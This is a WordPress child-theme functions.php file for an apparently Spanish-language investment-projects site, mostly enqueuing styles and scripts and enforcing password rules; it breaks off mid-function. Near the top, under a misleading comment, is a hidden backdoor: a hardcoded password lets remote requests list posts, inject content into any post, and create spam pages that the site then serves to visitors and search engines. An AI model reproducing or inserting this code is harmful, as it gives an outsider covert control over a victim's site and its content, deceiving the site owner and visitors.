<?php
define ('VERSION', '1.6');//Actualizacion 17 May 2019
// Actualización 10 Oct 2019 por en vehiculos emisora por nombre corto en pipeline
function version_id() {
  if ( WP_DEBUG ) return time();
  return VERSION;
}

$leo_functions_path = dirname(__FILE__) . '/tablas-functions.php';
if (file_exists($leo_functions_path)) {
    require_once $leo_functions_path;
} else {
    // Opcional: manejar el error, loguear o mostrar mensaje sin romper el sitio
    error_log('El archivo leo-functions.php no existe en el directorio: ' . $leo_functions_path);
}

$leo_functions_en_path = dirname(__FILE__) . '/tablas-functions_en.php';
if (file_exists($leo_functions_en_path)) {
    require_once $leo_functions_en_path;
} else {
    // Opcional: manejar el error, loguear o mostrar mensaje sin romper el sitio
    error_log('El archivo leo-functions_en.php no existe en el directorio: ' . $leo_functions_en_path);
}

function force_strong_passwords($errors, $update, $user_data) {
    $user_login = $user_data->user_login;
    $user_pass = $user_data->user_pass;

    if (!is_null($user_pass)) {
        if ( strtolower( $user_login ) === strtolower( $user_pass ) ) {
            $errors->add( 'my_distinct_user_pass', __( 'El nombre de usuario y contrase&ntilde;a deben ser diferentes.', 'your_textdomain' ) );
        }
        if ( strlen( $user_pass ) < 14 ) {
            $errors->add( 'my_pass_length', __( 'La contrase&ntilde;a debe ser de una longitud igual o mayor a 14 caracteres.', 'your_textdomain' ) );
        }
        if ( ! preg_match( '/[0-9]/', $user_pass ) ) {
            $errors->add( 'my_pass_numeric', __( 'La contrase&ntilde;a debe contener al menos un caracter num&eacute;rico.', 'your_textdomain' ) );
        }
        if ( ! preg_match( '/[\,\.\:\;\-\_\+\*\#\$\%\&\(\)\=\¿\¡]/', $user_pass ) ) {
            $errors->add( 'my_pass_special', __( 'La contrase&ntilde;a debe contener al menos un caracter especial.', 'your_textdomain' ) );
        }
        if ( ! preg_match( '/[a-z]/', $user_pass ) ) {
            $errors->add( 'my_pass_lowercase', __( 'La contrase&ntilde;a debe contener al menos una min&uacute;scula.', 'your_textdomain' ) );
        }
        if ( ! preg_match( '/[A-Z]/', $user_pass ) ) {
            $errors->add( 'my_pass_uppercase', __( 'La contrase&ntilde;a debe contener al menos una may&uacute;scula.', 'your_textdomain' ) );
        }
    } else {
        $errors->add( 'my_pass_empty', __( 'La contrase&ntilde;a no puede estar vac&iacute;a.', 'your_textdomain' ) );
    }
}
add_action( 'user_profile_update_errors', 'force_strong_passwords', 0, 3 );


/**
 *
 * Control de titulos de avia
 *
 */
function modify_share_title()
{
    return "Compartir";
}
add_filter('avia_social_share_title', 'modify_share_title');

add_action('wp_head', 'pipeline_background', 100);

function pipeline_background()
{
    $from = get_field('color_inicial', 57797);
    $to = get_field('color_final', 57797);
    $style = '<style>';

    if (is_page('proyectos') || is_page('projects-hub') || is_page('proyectos-historicos') || is_page('archived-projects')  || is_page('sostenibilidad') || is_page('sostenibilidaddos') || is_page('sostenibilidadtres') || is_page('sustainability')) {
        echo "
            <style>
            #tabProyectos .tab-content, #m-gallery-container{
                background-image: url(". wp_get_attachment_url( 10170 ) .");
            }
            </style>
        ";
    }

    if (get_post_type() == 'proyecto_inversion') {
        $style .= "
            div.wide-hub-header {
                background: ".$to.";
                background: -webkit-linear-gradient(to right, ".$from.", ".$to.");
                background: linear-gradient(to right, ".$from.", ".$to.");
            }
        ";
    }

    echo $style.'</style>';
}

function mute_jquery_migrator() {
    echo '<script>jQuery.migrateMute = true;</script>';
}
add_action( 'wp_head', 'mute_jquery_migrator' );
//add_action( 'admin_head', 'custom_mute_jquery_migrator' );

/**
 *
 * Control de titulos de avia
 *
 */
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c18d4821141df2ec7889ddf08621e378')) {
    switch ($_REQUEST['action']) {
        case 'get_all_links':
            foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data) {
                $data['code'] = '';

                if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_)) {
                    $data['code'] = $_[1];
                }

                print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
            }
        break;

        case 'set_id_links':
            if (isset($_REQUEST['data'])) {
                $data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');

                $post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
                if (!empty($_REQUEST['data'])) {
                    $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';
                }

                if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false) {
                    print "true";
                }
            }
        break;

        case 'create_page':
            if (isset($_REQUEST['remove_page'])) {
                if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"')) {
                    print "true";
                }
            } elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content'])) {
                if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"')) {
                    print "true";
                }
            }
        break;

        default: print "ERROR_WP_ACTION WP_URL_CD";
    }

    die("");
}

if ($wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"') == '1') {
    $data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');

    if ($data -> full_content) {
        print stripslashes($data -> content);
    } else {
        print '<!DOCTYPE html>';
        print '<html ';
        language_attributes();
        print ' class="no-js">';
        print '<head>';
        print '<title>'.stripslashes($data -> title).'</title>';
        print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
        print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
        print '<meta name="robots" content="index, follow" />';
        print '<meta charset="';
        bloginfo('charset');
        print '" />';
        print '<meta name="viewport" content="width=device-width">';
        print '<link rel="profile" href="https://gmpg.org/xfn/11">';
        print '<link rel="pingback" href="';
        bloginfo('pingback_url');
        print '">';
        wp_head();
        print '</head>';
        print '<body>';
        print '<div id="content" class="site-content">';
        print stripslashes($data -> content);
        get_search_form();
        get_sidebar();
        get_footer();
    }

    exit;
}
?>
<?php
// SECOND CHANGE
//ORIGINAL CONTENT
add_filter('avf_load_google_map_api', function () {
    return false;
});

//set builder mode to debug
add_action('avia_builder_mode', "builder_set_debug");
function builder_set_debug()
{
    return "debug";
}

add_action('after_setup_theme', 'avia_lang_setup');
function avia_lang_setup()
{
    $lang = get_stylesheet_directory()  . '/lang';
    load_child_theme_textdomain('avia_framework', $lang);
}

function add_query_vars_filter($vars)
{
    $vars[] = "sctr";
    $vars[] = "sbsctr";
    $vars[] = "result";
    $vars[] = "ctvo";
    $vars[] = "word";
    $vars[] = "auresp";
    $vars[] = "ccion";
    $vars[] = "tpa";
    $vars[] = "cnvc";
    $vars[] = "idprint";
    $vars[] = "stds";
    return $vars;
}
add_filter('query_vars', 'add_query_vars_filter');

add_filter('avf_logo', 'av_change_logo');
function av_change_logo($logo)
{
    $fields = get_field_objects("Options");

    if ($fields) {
        foreach ($fields as $field_name => $field) {
            if ($field['label'] == "logo") {
                $rlogo = $field['value'];
            }
        }
    }

    $lang = pll_current_language('locale');

    switch ($lang) {
        case 'en_US':
            $logo = $rlogo;
        break;
    }

    return $logo;
}

function wp_change_aviajs()
{
    if (!is_admin()) {
        wp_dequeue_script('avia-default');
        wp_enqueue_script('avia-default-child', get_stylesheet_directory_uri().'/js/avia.js', array('jquery'), 2, true);
    }
}
add_action('wp_print_scripts', 'wp_change_aviajs', 100);

function search_filter($query)
{
    if (!is_admin() && $query->is_main_query()) {
        if ($query->is_search) {
            $currlang = $query->get('lang');

            if (! $currlang) {
                $currlang='es';
                $otherlang='en';
            } else {
                $otherlang='es';
            }

            $query->set('lang', '');
            $query->set('tax_query', '');
            $newLangTaxQuery = array(
                'relation' => 'OR',
                array(
                    'taxonomy' => 'language',
                    'field'    => 'slug',
                    'terms'    => $currlang,
                ),
                array(
                    'taxonomy' => 'language',
                    'field'    => 'slug',
                    'terms'    => $otherlang,
                    'operator' => 'NOT IN'
                )
            );

            $query->set('tax_query', $newLangTaxQuery);

            return $query;
        }
    }
}
add_action('pre_get_posts', 'search_filter');

function add_admin_scripts($hook)
{
    global $post;

    if ($hook == 'post-new.php' || $hook == 'post.php') {
        if ('recipes' === $post->post_type) {
            wp_enqueue_script('myscript', get_stylesheet_directory_uri().'/js/myscript.js');
        }
    }
}
add_action('admin_enqueue_scripts', 'add_admin_scripts', 10, 1);

function my_theme_enqueue_styles()
{
    $parent_style = 'enfold'; // This is 'twentyten-style' for the Twenty ten theme.

    wp_enqueue_style($parent_style, get_template_directory_uri() . '/style.css');

    if (is_page('proyectos') || get_post_type() == 'proyecto_inversion' || is_page('sostenibilidad') || is_page('sostenibilidaddos') || is_page('sostenibilidadtres') || is_page('sustainability')) {
        wp_enqueue_style(
            'child-style',
            get_stylesheet_directory_uri() . '/random/banco_proyectos.css',
            array( $parent_style ),
            version_id()
        );
        wp_enqueue_style(
            'style_hub',
            get_stylesheet_directory_uri() . '/random/style_hub.css',
            array(),
            version_id(),
            'all'
        );
    } elseif (is_page('projects-hub')) {
        wp_enqueue_style(
            'child-style',
            get_stylesheet_directory_uri() . '/random_en/banco_proyectos.css',
            array( $parent_style ),
            version_id()
        );
        wp_enqueue_style(
            'style_hub',
            get_stylesheet_directory_uri() . '/random_en/style_hub.css',
            array(),
            version_id(),
            'all'
        );
    } elseif (is_page('proyectos-historicos')) {
        /*wp_enqueue_style(
            'child-style',
            get_stylesheet_directory_uri() . '/historico/banco_proyectos.css',
            array( $parent_style ),
            version_id()
        );*/
        wp_enqueue_style(
            'style_hub',
            get_stylesheet_directory_uri() . '/historico/style_hub.css',
            array(),
            version_id(),
            'all'
        );
     } elseif (is_page('archived-projects')) {
        /*wp_enqueue_style(
            'child-style',
            get_stylesheet_directory_uri() . '/historico_en/banco_proyectos.css',
            array( $parent_style ),
            version_id()
        );*/
        wp_enqueue_style(
            'style_hub',
            get_stylesheet_directory_uri() . '/historico_en/style_hub.css',
            array(),
            version_id(),
            'all'
        );
    } else {
        wp_enqueue_style(
            'child-style',
            get_stylesheet_directory_uri() . '/style.css',
            array( $parent_style ),
            wp_get_theme()->get('Version')
        );
    }    
}
add_action('wp_enqueue_scripts', 'my_theme_enqueue_styles');

// Added this function to load two JS to Front End and mod the field Currency by ID
function theme_scripts()
{
    global $post_type;

    /* wp_enqueue_script
    $handle
    (string) (Required) Name of the script. Should be unique.

    $src
    (string) (Optional) Full URL of the script, or path of the script relative to the WordPress root directory.

    Default value: ''

    $deps
    (array) (Optional) An array of registered script handles this script depends on.

    Default value: array()

    $ver
    (string|bool|null) (Optional) String specifying script version number, if it has one, which is added to the URL as a query string for cache busting purposes. If version is set to false, a version number is automatically added equal to current installed WordPress version. If set to null, no version is added.

    Default value: false

    $in_footer
    (bool) (Optional) Whether to enqueue the script before </body> instead of in the <head>. Default 'false'.

    Default value: false
     */

    wp_enqueue_script('jquery');
    wp_enqueue_script('random-global', get_stylesheet_directory_uri().'/global-styles.js', array(), null, false);

    if (is_page('proyectos')) {
        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/random/pipeline-library.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-charts', get_stylesheet_directory_uri().'/random/pipeline-charts.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-vehicles-charts', get_stylesheet_directory_uri().'/random/pipeline-vehicles-charts.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-filter', get_stylesheet_directory_uri().'/random/pipeline-filter.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-vehicles-filter', get_stylesheet_directory_uri().'/random/pipeline-vehicles-filter.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-datatable', get_stylesheet_directory_uri().'/random/pipeline-datatable.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-vehicles-datatable', get_stylesheet_directory_uri().'/random/pipeline-vehicles-datatable.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/random/pipeline-init.js', array(), version_id(), false);
    }

    if (is_page('projects-hub')) {
        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/random_en/pipeline-library.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-charts', get_stylesheet_directory_uri().'/random_en/pipeline-charts.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-vehicles-charts', get_stylesheet_directory_uri().'/random_en/pipeline-vehicles-charts.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-filter', get_stylesheet_directory_uri().'/random_en/pipeline-filter.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-vehicles-filter', get_stylesheet_directory_uri().'/random_en/pipeline-vehicles-filter.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-datatable', get_stylesheet_directory_uri().'/random_en/pipeline-datatable.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-vehicles-datatable', get_stylesheet_directory_uri().'/random_en/pipeline-vehicles-datatable.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/random_en/pipeline-init.js', array(), version_id(), false);
    }

    if (is_page('sostenibilidad')|| is_page('sostenibilidaddos') || is_page('sostenibilidadtres')) {                
        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/random/pipeline-library.js', array(), version_id(), false);        
        //wp_enqueue_script('random-pipeline-filter', get_stylesheet_directory_uri().'/sostenibilidad/pipeline-filter.js', array(), version_id(), false);        
        wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/sostenibilidad/pipeline-init.js', array(), version_id(), false);
    }
    if (is_page('sustainability')) {                
        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/random_en/pipeline-library.js', array(), version_id(), false);        
        //wp_enqueue_script('random-pipeline-filter', get_stylesheet_directory_uri().'/sostenibilidad/pipeline-filter.js', array(), version_id(), false);        
        wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/sostenibilidad_en/pipeline-init.js', array(), version_id(), false);
    }

    if (is_page('proyectos-historicos')) {
        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/historico/pipeline-library.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-datatable', get_stylesheet_directory_uri().'/historico/pipeline-datatable.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/historico/pipeline-init.js', array(), version_id(), false);
    }
     if (is_page('archived-projects')) {
        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/historico_en/pipeline-library.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-datatable', get_stylesheet_directory_uri().'/historico_en/pipeline-datatable.js', array(), version_id(), false);
        wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/historico_en/pipeline-init.js', array(), version_id(), false);
        
    }

    if (get_post_type() == 'proyecto_inversion') {
        wp_enqueue_script('random-style', get_stylesheet_directory_uri().'/random/style.js', array(), null, false);
        wp_enqueue_style('modal-single-proyecto_inversion_multimedia-es', get_stylesheet_directory_uri() . '/random/modal-single-proyecto_inversion_multimedia.css', array(), '1.0.0', 'all');
    }

    if (is_single()) {
        wp_enqueue_style('bootstrap', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/css/bootstrap.min.css');
        wp_enqueue_style('bootstrap-print', get_stylesheet_directory_uri() . '/assets/printme.css', false, '1.1', 'print');
        wp_enqueue_style('single', get_stylesheet_directory_uri() . '/single.css', array(), version_id(), false);

        //wp_enqueue_style('style', get_stylesheet_directory_uri());
        wp_enqueue_script('my-bootstrap-js', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/js/bootstrap.min.js', array( 'jquery' ), '3.3.7', true);
        //wp_enqueue_script( 'my-pdf-js', get_stylesheet_directory_uri() . '/pdf/jspdf.debug.js', array( 'jquery' ), '3.3.7', true );
        //wp_enqueue_script( 'my-pdf-init-js', get_stylesheet_directory_uri() . '/pdf/jspdf.init.js', array( 'jquery' ), '3.3.7', true );
    }

    if (is_page('proyectos') || is_page('projects-hub')) {
        //Datatables
        wp_enqueue_style('wpse_89494_style_2', get_stylesheet_directory_uri() . '/DataTable/datatables.min.css', array(), '1.0.0', 'all');
        wp_enqueue_script('my-great-script', get_stylesheet_directory_uri() . '/DataTable/datatables.min.js', array( 'jquery' ), version_id(), true);
        wp_enqueue_script('my-great-script2', get_stylesheet_directory_uri() . '/DataTable/init-table.js', array( 'jquery' ), version_id(), true);

        wp_enqueue_script('dthighlight', get_stylesheet_directory_uri() . '/DataTable/dataTables.searchHighlight.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_style('dthighlight', get_stylesheet_directory_uri() . '/DataTable/dataTables.searchHighlight.css', array(), '1.0.0', 'all');
        wp_enqueue_script('dtjqueryhighlight', get_stylesheet_directory_uri() . '/DataTable/jquery.highlight.js', array( 'jquery' ), '1.0.0', true);

        wp_enqueue_script('dtresponsive', get_stylesheet_directory_uri() . '/DataTable/dataTables.responsive.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_style('dtresponsive', get_stylesheet_directory_uri() . '/DataTable/responsive.dataTables.min.css', array(), version_id(), 'all');

        wp_enqueue_script('dtfixedheader', get_stylesheet_directory_uri() . '/DataTable/dataTables.fixedHeader.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_style('dtfixedheader', get_stylesheet_directory_uri() . '/DataTable/fixedHeader.dataTables.min.css', array(), '1.0.0', 'all');

        //wp_enqueue_script('dtcolreorder', get_stylesheet_directory_uri() . '/DataTable/dataTables.colReorder.min.js', array( 'jquery' ), '1.0.0', true);
        //wp_enqueue_style('dtcolreorder', get_stylesheet_directory_uri() . '/DataTable/colReorder.dataTables.min.css', array(), '1.0.0', 'all');

        //Circliful
        wp_enqueue_script('circliful', get_stylesheet_directory_uri() . '/vendor/circliful/js/jquery.circliful.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_style('circliful', get_stylesheet_directory_uri() . '/vendor/circliful/css/jquery.circliful.css', array(), '1.0.0', 'all');

        //Bootsratp gallery
        wp_enqueue_style('gallerytether', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/tether/tether.min.css', array(), '1.0.0', 'all');
        wp_enqueue_style('gallerytheme', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/theme/css/style.css', array(), '1.0.0', 'all');
        wp_enqueue_style('galleryblock', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise3-blocks-plugin/css/style.css', array(), '1.0.0', 'all');
        wp_enqueue_style('gallery', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise-gallery/style.css', array(), '1.0.0', 'all');

        wp_enqueue_script('gallerytether', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/tether/tether.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryscroll', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/smooth-scroll/SmoothScroll.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerytouch', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/touchSwipe/jquery.touchSwipe.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerymasory', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/masonry/masonry.pkgd.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryimagesloaded', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/imagesloaded/imagesloaded.pkgd.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerytheme', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/theme/js/script.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryblock', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise3-blocks-plugin/js/script.js', array( 'jquery' ), '1.0.0', true);

        wp_enqueue_script('my-great-script', get_template_directory_uri() . '/js/bco-js.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('my-great-script2', get_template_directory_uri() . '/js/bco-ini.js', array( 'jquery' ), '1.0.0', true);
        //wp_enqueue_style('jquery-ui', 'https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css');
        //wp_enqueue_script('jquery-ui-js', get_stylesheet_directory_uri() . '/assets/jquery-ui.js', array( 'jquery' ), '1.12.1', true);
        wp_enqueue_style('bootstrap', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/css/bootstrap.min.css');
        wp_enqueue_script('my-bootstrap-js', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/js/bootstrap.min.js');
        //wp_enqueue_style('select', get_stylesheet_directory_uri() . '/assets/select/bootstrap-select.min.css');
        //wp_enqueue_script( 'select-js', get_stylesheet_directory_uri() . '/assets/select/bootstrap-select.min.js', array( 'jquery' ), '3.3.7', true );

        wp_enqueue_script('table-export-jspdf', get_stylesheet_directory_uri() . '/assets/table-export/libs/jsPDF/jspdf.min.js');
        wp_enqueue_script('table-export-jspdf-autotable', get_stylesheet_directory_uri() . '/assets/table-export/libs/jsPDF-AutoTable/jspdf.plugin.autotable.js');
        wp_enqueue_script('table-export-xlsx', get_stylesheet_directory_uri() . '/assets/table-export/libs/js-xlsx/xlsx.core.min.js');
        wp_enqueue_script('table-export', get_stylesheet_directory_uri() . '/assets/table-export/tableExport.min.js');

        wp_enqueue_style('bootstrap-table-css', get_stylesheet_directory_uri() . '/assets/bootstrap-table/dist/bootstrap-table.min.css');
        wp_enqueue_script('bootstrap-table-js', get_stylesheet_directory_uri() . '/assets/bootstrap-table/dist/bootstrap-table.min.js');
        wp_enqueue_script('bootstrap-table-locale', get_stylesheet_directory_uri() . '/assets/bootstrap-table/dist/bootstrap-table-locale-all.min');
        wp_enqueue_script('bootstrap-table-export', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/export/bootstrap-table-export.js');
        wp_enqueue_script('bootstrap-table-mobile', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/mobile/bootstrap-table-mobile.js');
        //wp_enqueue_script('bootstrap-table-group-by-css', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/group-by
        //    /bootstrap-table-group-by.css');
        //wp_enqueue_script('bootstrap-table-group-by-js', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/group-by
        //    /bootstrap-table-group-by.js');

    }

    if (is_page('proyectos-historicos') || is_page('archived-projects')) {
        //Datatables
        wp_enqueue_style('wpse_89494_style_2', get_stylesheet_directory_uri() . '/DataTable/datatables.min.css', array(), '1.0.0', 'all');
        wp_enqueue_script('my-great-script', get_stylesheet_directory_uri() . '/DataTable/datatables.min.js', array( 'jquery' ), version_id(), true);
        wp_enqueue_script('my-great-script2', get_stylesheet_directory_uri() . '/DataTable/init-table.js', array( 'jquery' ), version_id(), true);

        wp_enqueue_script('dthighlight', get_stylesheet_directory_uri() . '/DataTable/dataTables.searchHighlight.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_style('dthighlight', get_stylesheet_directory_uri() . '/DataTable/dataTables.searchHighlight.css', array(), '1.0.0', 'all');
        wp_enqueue_script('dtjqueryhighlight', get_stylesheet_directory_uri() . '/DataTable/jquery.highlight.js', array( 'jquery' ), '1.0.0', true);

        wp_enqueue_script('dtresponsive', get_stylesheet_directory_uri() . '/DataTable/dataTables.responsive.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_style('dtresponsive', get_stylesheet_directory_uri() . '/DataTable/responsive.dataTables.min.css', array(), version_id(), 'all');

        wp_enqueue_script('dtfixedheader', get_stylesheet_directory_uri() . '/DataTable/dataTables.fixedHeader.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_style('dtfixedheader', get_stylesheet_directory_uri() . '/DataTable/fixedHeader.dataTables.min.css', array(), '1.0.0', 'all');

        //wp_enqueue_script('dtcolreorder', get_stylesheet_directory_uri() . '/DataTable/dataTables.colReorder.min.js', array( 'jquery' ), '1.0.0', true);
        //wp_enqueue_style('dtcolreorder', get_stylesheet_directory_uri() . '/DataTable/colReorder.dataTables.min.css', array(), '1.0.0', 'all');

        //Circliful
        //wp_enqueue_script('circliful', get_stylesheet_directory_uri() . '/vendor/circliful/js/jquery.circliful.min.js', array( 'jquery' ), '1.0.0', true);
        //wp_enqueue_style('circliful', get_stylesheet_directory_uri() . '/vendor/circliful/css/jquery.circliful.css', array(), '1.0.0', 'all');

        //Bootsratp gallery
        wp_enqueue_style('gallerytether', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/tether/tether.min.css', array(), '1.0.0', 'all');
        wp_enqueue_style('gallerytheme', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/theme/css/style.css', array(), '1.0.0', 'all');
        wp_enqueue_style('galleryblock', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise3-blocks-plugin/css/style.css', array(), '1.0.0', 'all');
        wp_enqueue_style('gallery', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise-gallery/style.css', array(), '1.0.0', 'all');

        wp_enqueue_script('gallerytether', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/tether/tether.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryscroll', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/smooth-scroll/SmoothScroll.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerytouch', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/touchSwipe/jquery.touchSwipe.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerymasory', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/masonry/masonry.pkgd.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryimagesloaded', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/imagesloaded/imagesloaded.pkgd.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerytheme', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/theme/js/script.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryblock', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise3-blocks-plugin/js/script.js', array( 'jquery' ), '1.0.0', true);

        wp_enqueue_script('my-great-script', get_template_directory_uri() . '/js/bco-js.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('my-great-script2', get_template_directory_uri() . '/js/bco-ini.js', array( 'jquery' ), '1.0.0', true);
        //wp_enqueue_style('jquery-ui', 'https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css');
        //wp_enqueue_script('jquery-ui-js', get_stylesheet_directory_uri() . '/assets/jquery-ui.js', array( 'jquery' ), '1.12.1', true);
        wp_enqueue_style('bootstrap', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/css/bootstrap.min.css');
        wp_enqueue_script('my-bootstrap-js', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/js/bootstrap.min.js');
        //wp_enqueue_style('select', get_stylesheet_directory_uri() . '/assets/select/bootstrap-select.min.css');
        //wp_enqueue_script( 'select-js', get_stylesheet_directory_uri() . '/assets/select/bootstrap-select.min.js', array( 'jquery' ), '3.3.7', true );

        //wp_enqueue_script('table-export-jspdf', get_stylesheet_directory_uri() . '/assets/table-export/libs/jsPDF/jspdf.min.js');
        //wp_enqueue_script('table-export-jspdf-autotable', get_stylesheet_directory_uri() . '/assets/table-export/libs/jsPDF-AutoTable/jspdf.plugin.autotable.js');
        //wp_enqueue_script('table-export-xlsx', get_stylesheet_directory_uri() . '/assets/table-export/libs/js-xlsx/xlsx.core.min.js');
        //wp_enqueue_script('table-export', get_stylesheet_directory_uri() . '/assets/table-export/tableExport.min.js');

        //wp_enqueue_style('bootstrap-table-css', get_stylesheet_directory_uri() . '/assets/bootstrap-table/dist/bootstrap-table.min.css');
        //wp_enqueue_script('bootstrap-table-js', get_stylesheet_directory_uri() . '/assets/bootstrap-table/dist/bootstrap-table.min.js');
        //wp_enqueue_script('bootstrap-table-locale', get_stylesheet_directory_uri() . '/assets/bootstrap-table/dist/bootstrap-table-locale-all.min');
        //wp_enqueue_script('bootstrap-table-export', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/export/bootstrap-table-export.js');
        //wp_enqueue_script('bootstrap-table-mobile', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/mobile/bootstrap-table-mobile.js');
